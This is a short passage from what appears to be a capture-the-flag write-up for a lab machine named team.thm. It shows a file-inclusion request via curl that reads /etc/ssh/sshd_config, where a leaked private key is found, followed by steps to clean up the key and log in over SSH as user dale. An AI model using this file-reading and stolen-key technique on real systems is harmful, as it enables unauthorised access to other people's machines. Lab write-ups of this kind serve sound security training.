`#------BEGIN OPENSSH PRIVATE KEY----`
........
......
`#----END OPENSSH PRIVATE KEY-----

==CURL:==
```bash
curl http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```
==Copy to:==
```bash
mousepad dale_id_rsa
```
==Remove '#' from the file==
```bash
cat dale_id_rsa | awk -F '#' '{print $2}' > dale_id_rsa2
or
cat dale_id_rsa | sed 's/#//g' > dale_id_rsa2
```
==Give rights:==
```bash
chmod 600 dale_id_rsa2
```
==Get shell==
```bash
ssh -i dale_id_rsa2 dale@team.thm
dale@TEAM:~$whoami 
```

